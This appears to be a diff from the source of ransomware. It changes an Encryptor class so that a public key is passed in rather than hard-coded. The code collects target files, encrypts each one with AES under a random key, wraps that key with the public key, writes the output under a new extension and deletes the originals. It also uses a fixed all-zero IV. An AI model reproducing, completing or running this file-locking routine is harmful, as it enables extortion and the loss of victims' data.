@@ -49,24 +49,24 @@ class Encryptor:
         password = self.__b64enc(cipher.encrypt(password.encode()))
         return password
 
-    def __encryptFile(self,file):
+    def __encryptFile(self,file,pubkey):
         password = os.urandom(32)
         IV = 16 * '\x00'
         with open(file,"rb") as fIn:
             with open(file+self.config['extension'], "wb") as fOut:
                 message = self.pad(fIn.read())
                 aes = AES.new(password,AES.MODE_CBC,IV)
-                password = self.__encryptPass(password,'pubkey1.der')
+                password = self.__encryptPass(password,pubkey)
                 fOut.write(password + ' ')
                 # fOut.write(aes.encrypt(message))
                 fOut.write(self.__b64enc(aes.encrypt(message)))
             os.remove(file)
 
     
-    def encryptFiles(self):
+    def encryptFiles(self,pubkey):
         self.__addSuitableFile()
         size = 0
         for file in self.files:
             size += os.path.getsize(file)
-            self.__encryptFile(file)
+            self.__encryptFile(file,pubkey)
         return size
